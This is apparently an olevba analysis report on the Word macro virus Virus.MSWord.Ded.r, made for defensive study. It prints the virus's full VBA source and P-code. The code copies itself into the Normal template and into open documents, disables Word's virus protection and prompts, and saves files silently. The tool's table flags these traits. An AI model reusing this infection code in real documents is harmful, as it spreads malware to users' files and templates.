olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ded.r
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ded.r - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Application.EnableCancelKey = wdCancelDisabled
With Options:
With Options:
    .ConfirmConversions = False:
    .ConfirmConversions = False:
    .VirusProtection = True:
    .VirusProtection = True:
    .SaveNormalPrompt = False:
    .SaveNormalPrompt = False:
    .SavePropertiesPrompt = False:
    .SavePropertiesPrompt = False:
End With
End With
s = ActiveDocument.Saved
s = ActiveDocument.Saved
sName = "c:\evolve.tmp"
sName = "c:\evolve.tmp"
sFunc = "Private Sub Document_Open()"
sFunc = "Private Sub Document_Open()"
Found = False
Found = False
If Dir(sName) <> "" Then Kill sName
If Dir(sName) <> "" Then Kill sName
Open sName For Output As #1
Open sName For Output As #1
For i = 0 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
    a = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
    a = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
    If Found = False And (a = sFunc) Then Found = True
    If Found = False And (a = sFunc) Then Found = True
    If a <> "" And Found = True Then Print #1, a
    If a <> "" And Found = True Then Print #1, a
    If a = "End Sub" And Found = True Then Found = False
    If a = "End Sub" And Found = True Then Found = False
Next i
Close #1
Close #1
j = 1
j = 1
k = 1
k = 1
t = 0
t = 0
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> sFunc Then
If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> sFunc Then
    Set nml = NormalTemplate.VBProject.VBComponents.Item(1)
    Set nml = NormalTemplate.VBProject.VBComponents.Item(1)
    t = t + 1
    t = t + 1
End If
End If
If ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> sFunc Then
If ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> sFunc Then
    Set atv = ActiveDocument.VBProject.VBComponents.Item(1)
    Set atv = ActiveDocument.VBProject.VBComponents.Item(1)
    t = t + 2
    t = t + 2
End If
End If
If t > 0 Then
If t > 0 Then
    Open sName For Input As #1
    Open sName For Input As #1
    If LOF(1) = 0 Then GoTo quit
    If LOF(1) = 0 Then GoTo quit
    i = 1
    i = 1
    Do While Not EOF(1)
    Do While Not EOF(1)
        Line Input #1, a
        Line Input #1, a
        If t = 1 Or t = 3 Then
        If t = 1 Or t = 3 Then
            nml.CodeModule.InsertLines j, a
            nml.CodeModule.InsertLines j, a
            j = j + 1
            j = j + 1
        End If
        End If
        If t = 2 Or t = 3 Then
        If t = 2 Or t = 3 Then
            atv.CodeModule.InsertLines k, a
            atv.CodeModule.InsertLines k, a
            k = k + 1
            k = k + 1
        End If
        End If
    Loop
    Loop
quit:
    Close #1
    Close #1
End If
End If
With Dialogs(wdDialogFileSumaryInfo):
With Dialogs(wdDialogFileSumaryInfo):
    .Title = "Ethan Frome":
    .Title = "Ethan Frome":
    .Author = "EW/LN/CB":
    .Author = "EW/LN/CB":
    .Keywrds = "Ethan":
    .Keywrds = "Ethan":
    .Execute:
    .Execute:
End With
End With
If Left(ActiveDocument.Name, 8) <> "Document" Then
If Left(ActiveDocument.Name, 8) <> "Document" Then
    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End If
End If
If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s
If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s
Kill sName
Kill sName
Application.EnableCancelKey = wdCancelInterrupt
Application.EnableCancelKey = wdCancelInterrupt
End Sub
Private Sub Document_Close()
On Error GoTo skam
Options.VirusProtection = False
SWLABS99
skam:
End Sub
Private Sub SWLABS99()
If Not ActiveDocument.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then
    For i = 1 To NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines
        d = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(i, 1)
        If Len(d) > 0 And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then
            While Mid(d, Len(d) - 1, 2) = " _"
                i = i + 1
                d = Left(d, Len(d) - 1) & NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(i, 1)
            Wend
            ActiveDocument.VBProject.VBComponents(1).CodeModule.InsertLines i * 2, d
        End If
    Next i
    ActiveDocument.SaveAs AddToRecentFiles:=False
Else
If Not NormalTemplate.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then
    For i = 1 To ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines
        d = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(i, 1)
        If Len(d) > 0 And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then
            While Mid(d, Len(d) - 1, 2) = " _"
                i = i + 1
                d = Left(d, Len(d) - 1) & ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(i, 1)
            Wend
            NormalTemplate.VBProject.VBComponents(1).CodeModule.InsertLines i * 2, d
        End If
    Next i
    NormalTemplate.Save
End If
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Ded.r
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 8541 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #4:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #5:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' 	BoS 0x0000 
' Line #6:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' 	BoS 0x0000 
' Line #7:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' 	BoS 0x0000 
' Line #8:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' 	BoS 0x0000 
' Line #9:
' 	LitVarSpecial (True)
' 	MemStWith VirusProtection 
' 	BoS 0x0000 
' Line #10:
' 	LitVarSpecial (True)
' 	MemStWith VirusProtection 
' 	BoS 0x0000 
' Line #11:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' 	BoS 0x0000 
' Line #12:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' 	BoS 0x0000 
' Line #13:
' 	LitVarSpecial (False)
' 	MemStWith SavePropertiesPrompt 
' 	BoS 0x0000 
' Line #14:
' 	LitVarSpecial (False)
' 	MemStWith SavePropertiesPrompt 
' 	BoS 0x0000 
' Line #15:
' 	EndWith 
' Line #16:
' 	EndWith 
' Line #17:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St s 
' Line #18:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St s 
' Line #19:
' 	LitStr 0x000D "c:\evolve.tmp"
' 	St sName 
' Line #20:
' 	LitStr 0x000D "c:\evolve.tmp"
' 	St sName 
' Line #21:
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	St sFunc 
' Line #22:
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	St sFunc 
' Line #23:
' 	LitVarSpecial (False)
' 	St Found 
' Line #24:
' 	LitVarSpecial (False)
' 	St Found 
' Line #25:
' 	Ld sName 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld sName 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #26:
' 	Ld sName 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld sName 
' 	ArgsCall Kill 0x0001 
' 	EndIf 
' Line #27:
' 	Ld sName 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #28:
' 	Ld sName 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #29:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #30:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St a 
' Line #31:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St a 
' Line #32:
' 	Ld Found 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld a 
' 	Ld sFunc 
' 	Eq 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Found 
' 	EndIf 
' Line #33:
' 	Ld Found 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld a 
' 	Ld sFunc 
' 	Eq 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Found 
' 	EndIf 
' Line #34:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Ld Found 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld a 
' 	PrintItemNL 
' 	EndIf 
' Line #35:
' 	Ld a 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Ld Found 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld a 
' 	PrintItemNL 
' 	EndIf 
' Line #36:
' 	Ld a 
' 	LitStr 0x0007 "End Sub"
' 	Eq 
' 	Ld Found 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St Found 
' 	EndIf 
' Line #37:
' 	Ld a 
' 	LitStr 0x0007 "End Sub"
' 	Eq 
' 	Ld Found 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St Found 
' 	EndIf 
' Line #38:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #39:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #40:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #41:
' 	LitDI2 0x0001 
' 	St j 
' Line #42:
' 	LitDI2 0x0001 
' 	St j 
' Line #43:
' 	LitDI2 0x0001 
' 	St k 
' Line #44:
' 	LitDI2 0x0001 
' 	St k 
' Line #45:
' 	LitDI2 0x0000 
' 	St t 
' Line #46:
' 	LitDI2 0x0000 
' 	St t 
' Line #47:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld sFunc 
' 	Ne 
' 	IfBlock 
' Line #48:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld sFunc 
' 	Ne 
' 	IfBlock 
' Line #49:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set nml 
' Line #50:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set nml 
' Line #51:
' 	Ld t 
' 	LitDI2 0x0001 
' 	Add 
' 	St t 
' Line #52:
' 	Ld t 
' 	LitDI2 0x0001 
' 	Add 
' 	St t 
' Line #53:
' 	EndIfBlock 
' Line #54:
' 	EndIfBlock 
' Line #55:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld sFunc 
' 	Ne 
' 	IfBlock 
' Line #56:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld sFunc 
' 	Ne 
' 	IfBlock 
' Line #57:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set atv 
' Line #58:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set atv 
' Line #59:
' 	Ld t 
' 	LitDI2 0x0002 
' 	Add 
' 	St t 
' Line #60:
' 	Ld t 
' 	LitDI2 0x0002 
' 	Add 
' 	St t 
' Line #61:
' 	EndIfBlock 
' Line #62:
' 	EndIfBlock 
' Line #63:
' 	Ld t 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #64:
' 	Ld t 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #65:
' 	Ld sName 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #66:
' 	Ld sName 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #67:
' 	LitDI2 0x0001 
' 	ArgsLd LOF 0x0001 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo quit 
' 	EndIf 
' Line #68:
' 	LitDI2 0x0001 
' 	ArgsLd LOF 0x0001 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo quit 
' 	EndIf 
' Line #69:
' 	LitDI2 0x0001 
' 	St i 
' Line #70:
' 	LitDI2 0x0001 
' 	St i 
' Line #71:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #72:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #73:
' 	LitDI2 0x0001 
' 	Ld a 
' 	LineInput 
' Line #74:
' 	LitDI2 0x0001 
' 	Ld a 
' 	LineInput 
' Line #75:
' 	Ld t 
' 	LitDI2 0x0001 
' 	Eq 
' 	Ld t 
' 	LitDI2 0x0003 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #76:
' 	Ld t 
' 	LitDI2 0x0001 
' 	Eq 
' 	Ld t 
' 	LitDI2 0x0003 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #77:
' 	Ld j 
' 	Ld a 
' 	Ld nml 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #78:
' 	Ld j 
' 	Ld a 
' 	Ld nml 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #79:
' 	Ld j 
' 	LitDI2 0x0001 
' 	Add 
' 	St j 
' Line #80:
' 	Ld j 
' 	LitDI2 0x0001 
' 	Add 
' 	St j 
' Line #81:
' 	EndIfBlock 
' Line #82:
' 	EndIfBlock 
' Line #83:
' 	Ld t 
' 	LitDI2 0x0002 
' 	Eq 
' 	Ld t 
' 	LitDI2 0x0003 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #84:
' 	Ld t 
' 	LitDI2 0x0002 
' 	Eq 
' 	Ld t 
' 	LitDI2 0x0003 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #85:
' 	Ld k 
' 	Ld a 
' 	Ld atv 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #86:
' 	Ld k 
' 	Ld a 
' 	Ld atv 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #87:
' 	Ld k 
' 	LitDI2 0x0001 
' 	Add 
' 	St k 
' Line #88:
' 	Ld k 
' 	LitDI2 0x0001 
' 	Add 
' 	St k 
' Line #89:
' 	EndIfBlock 
' Line #90:
' 	EndIfBlock 
' Line #91:
' 	Loop 
' Line #92:
' 	Loop 
' Line #93:
' 	Label quit 
' Line #94:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #95:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #96:
' 	EndIfBlock 
' Line #97:
' 	EndIfBlock 
' Line #98:
' 	StartWithExpr 
' 	Ld wdDialogFileSumaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' 	BoS 0x0000 
' Line #99:
' 	StartWithExpr 
' 	Ld wdDialogFileSumaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' 	BoS 0x0000 
' Line #100:
' 	LitStr 0x000B "Ethan Frome"
' 	MemStWith Title 
' 	BoS 0x0000 
' Line #101:
' 	LitStr 0x000B "Ethan Frome"
' 	MemStWith Title 
' 	BoS 0x0000 
' Line #102:
' 	LitStr 0x0008 "EW/LN/CB"
' 	MemStWith Author 
' 	BoS 0x0000 
' Line #103:
' 	LitStr 0x0008 "EW/LN/CB"
' 	MemStWith Author 
' 	BoS 0x0000 
' Line #104:
' 	LitStr 0x0005 "Ethan"
' 	MemStWith Keywrds 
' 	BoS 0x0000 
' Line #105:
' 	LitStr 0x0005 "Ethan"
' 	MemStWith Keywrds 
' 	BoS 0x0000 
' Line #106:
' 	ArgsMemCallWith Execute 0x0000 
' 	BoS 0x0000 
' Line #107:
' 	ArgsMemCallWith Execute 0x0000 
' 	BoS 0x0000 
' Line #108:
' 	EndWith 
' Line #109:
' 	EndWith 
' Line #110:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	IfBlock 
' Line #111:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	IfBlock 
' Line #112:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #113:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #114:
' 	EndIfBlock 
' Line #115:
' 	EndIfBlock 
' Line #116:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	Ld s 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld s 
' 	Ld ActiveDocument 
' 	MemSt Saved 
' 	EndIf 
' Line #117:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	Ld s 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld s 
' 	Ld ActiveDocument 
' 	MemSt Saved 
' 	EndIf 
' Line #118:
' 	Ld sName 
' 	ArgsCall Kill 0x0001 
' Line #119:
' 	Ld sName 
' 	ArgsCall Kill 0x0001 
' Line #120:
' 	Ld wdCancelInterrupt 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #121:
' 	Ld wdCancelInterrupt 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #122:
' 	EndSub 
' Line #123:
' 	FuncDefn (Private Sub Document_Close())
' Line #124:
' 	OnError skam 
' Line #125:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #126:
' 	ArgsCall SWLABS99 0x0000 
' Line #127:
' 	Label skam 
' Line #128:
' 	EndSub 
' Line #129:
' 	FuncDefn (Private Sub SWLABS99())
' Line #130:
' 	LitStr 0x000E "Document_Close"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	LitDI2 0x03E8 
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0007 
' 	Not 
' 	IfBlock 
' Line #131:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #132:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St d 
' Line #133:
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Gt 
' 	Ld d 
' 	LitStr 0x0001 " "
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitStr 0x0002 " _"
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "'"
' 	Eq 
' 	Not 
' 	And 
' 	IfBlock 
' Line #134:
' 	Ld d 
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0002 " _"
' 	Eq 
' 	While 
' Line #135:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #136:
' 	Ld d 
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	St d 
' Line #137:
' 	Wend 
' Line #138:
' 	Ld i 
' 	LitDI2 0x0002 
' 	Mul 
' 	Ld d 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #139:
' 	EndIfBlock 
' Line #140:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #141:
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #142:
' 	ElseBlock 
' Line #143:
' 	LitStr 0x000E "Document_Close"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	LitDI2 0x03E8 
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0007 
' 	Not 
' 	IfBlock 
' Line #144:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #145:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St d 
' Line #146:
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Gt 
' 	Ld d 
' 	LitStr 0x0001 " "
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitStr 0x0002 " _"
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "'"
' 	Eq 
' 	Not 
' 	And 
' 	IfBlock 
' Line #147:
' 	Ld d 
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0002 " _"
' 	Eq 
' 	While 
' Line #148:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #149:
' 	Ld d 
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	St d 
' Line #150:
' 	Wend 
' Line #151:
' 	Ld i 
' 	LitDI2 0x0002 
' 	Mul 
' 	Ld d 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #152:
' 	EndIfBlock 
' Line #153:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #154:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #155:
' 	EndIfBlock 
' Line #156:
' 	EndIfBlock 
' Line #157:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

